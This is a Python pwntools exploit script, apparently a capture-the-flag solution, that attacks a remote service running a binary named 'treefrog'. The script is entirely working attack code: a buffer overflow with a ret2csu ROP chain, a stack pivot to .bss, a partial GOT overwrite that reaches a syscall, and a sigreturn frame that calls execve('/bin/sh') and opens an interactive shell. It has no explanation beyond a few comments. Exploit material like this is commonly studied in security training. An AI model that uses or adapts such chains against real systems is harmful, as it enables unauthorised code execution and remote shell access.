from pwn import *

#p = process("./treefrog")
p = remote('121.170.91.17', 10101)
elf = ELF("./treefrog")

poprdi = 0x00000000004006c3
poprsi_r15 = 0x00000000004006c1
poprbp = 0x00000000004004f8
leaveret = 0x0000000000400650
binsh = elf.bss() + 0x400

set_arg = 0x4006BA
call_csu = 0x4006A0

context.log_level='debug'

pay = "\x00" 
pay += "A"*(0x90 - len(pay))
pay += "B"*8

pay += p64(set_arg)
pay += p64(0) + p64(1)
pay += p64(elf.got['read'])
pay += p64(0)
pay += p64(elf.bss()+16)
pay += p64(0x400)

pay += p64(call_csu)
pay += "C"*8
pay += p64(0) + p64(1)
pay += p64(elf.got['read'])
pay += p64(0)
pay += p64(elf.bss()+16)
pay += p64(0x400)

pay += p64(poprbp) + p64(elf.bss()+16) + p64(leaveret)

p.send(pay)


pay2 = "A"*8 + p64(set_arg)
pay2 += p64(0) + p64(1)
pay2 += p64(elf.got['read'])
pay2 += p64(0)
pay2 += p64(elf.got['write'])
pay2 += p64(1)

pay2 += p64(call_csu)
pay2 += "A"*8
pay2 += p64(0) + p64(1)
pay2 += p64(elf.got['read'])
pay2 += p64(0)
pay2 += p64(binsh)
pay2 += p64(15)

pay2 += p64(call_csu)
pay2 += "C"*8
pay2 += p64(0)*6               # rbx, rbp, r12 ~ r15

pay2 += p64(elf.plt['write'])  # syscall => sigreturn
pay2 += "A"*104
pay2 += p64(binsh)             # rdi
pay2 += p64(0)*4
pay2 += p64(59)                # rax
pay2 += p64(0)*2    
pay2 += p64(elf.plt['write'])  # rip
pay2 += p64(0)
pay2 += p64(0x33)
pay2 += "A"*32
pay2 += p64(0)

p.send(pay2)
sleep(0.1)

p.send('\xbe')

sleep(0.1)

p.send("/bin/sh" + '\x00'*8)

p.interactive()
